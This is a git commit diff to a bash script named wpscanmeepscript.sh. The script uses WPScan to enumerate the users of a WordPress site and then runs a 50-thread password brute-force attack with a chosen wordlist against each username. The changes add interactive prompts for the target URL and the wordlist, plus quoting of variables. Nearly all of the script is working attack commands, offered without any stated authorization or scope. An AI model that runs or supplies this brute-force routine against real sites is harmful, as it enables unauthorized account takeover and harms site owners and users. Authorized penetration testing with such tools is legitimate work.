25fd9e742d7f3740066c04a325b0f72813019fb4
meepmaster360 <paulomotaborges@gmail.com>
2024-04-04 20:30:16 +0100

    1

--- wpscanmeepscript.sh
+++ wpscanmeepscript.sh
@@ -162,15 +162,26 @@ function menu () {
 	menu
 }
 
-# Set the target WordPress URL
-TARGET_URL="http://example.com"
+###
 
-# Set the path to the wordlist containing passwords
-PASSWORDLIST="/path/to/passwordlist.txt"
+
+# Prompt user for WordPress URL
+read -p "Enter the target WordPress URL: " TARGET_URL
+
+# Prompt user to choose a wordlist
+echo "Choose a wordlist from the options below: "
+select FILENAME in $(ls /path/to/wordlists/*.txt); do
+    if [ -n "$FILENAME" ]; then
+        PASSWORDLIST="$FILENAME"
+        break
+    else
+        echo "Invalid selection. Please choose a valid option."
+    fi
+done
 
 # Perform user enumeration
 echo "Performing user enumeration..."
-wpscan --url $TARGET_URL --enumerate u > user_enum.txt
+wpscan --url "$TARGET_URL" --enumerate u > user_enum.txt
 
 # Extract usernames from the user enumeration result
 USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
@@ -178,10 +189,9 @@ USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
 # Perform brute force attack for each username
 for USERNAME in $USERLIST; do
     echo "Performing brute force attack for user: $USERNAME..."
-    wpscan --url $TARGET_URL --passwords $PASSWORDLIST --user $USERNAME --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output brute_force_result_$USERNAME.txt
+    wpscan --url "$TARGET_URL" --passwords "$PASSWORDLIST" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
 done
 
-echo "Done."
 
 ###
 # need to give option from many distionary e scan global, com todos os dicionarios
